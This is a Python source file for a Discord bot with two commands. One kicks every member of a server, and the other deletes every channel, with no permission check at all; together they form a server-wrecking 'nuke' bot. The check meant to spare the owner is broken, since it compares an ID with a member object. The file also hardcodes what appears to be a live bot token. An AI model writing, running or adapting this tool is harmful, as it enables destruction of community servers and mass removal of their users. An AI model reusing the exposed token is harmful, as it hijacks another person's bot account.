import discord
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.command()
@has_permissions(kick_members=True)
async def kick(ctx, reason: str=None):
    print("in here")
    print(ctx.guild.members)
    for member in ctx.guild.members:
        print(member)
        try:
            if member != bot.user and member.id != ctx.guild.owner:
                await member.kick(reason=reason)
        except Exception as e:
            print(e)


@bot.command()
async def del_chan(ctx):
    print("deleting channels")
    print(ctx.guild.channels)

    for channel in ctx.guild.channels:
        print(channel)
        try:
            await channel.delete()
        except:
            print(f"{channel} cannot be deleted")

@bot.event
async def on_ready():
    print(bot.guilds)
    print('We have logged in as {0.user}'.format(bot))

@bot.event
async def on_message(message):
    print("inside func")
    # print(message)
    
    if message.author == bot.user or message.author.bot:
        return
    await bot.process_commands(message)


bot.run('OTc2NzY5MDIwMDE3NjU1ODA5.GfKeVl.VGO5ff_Zv7neg_glIMxeBqqn6J29rGRuVyKq3E')
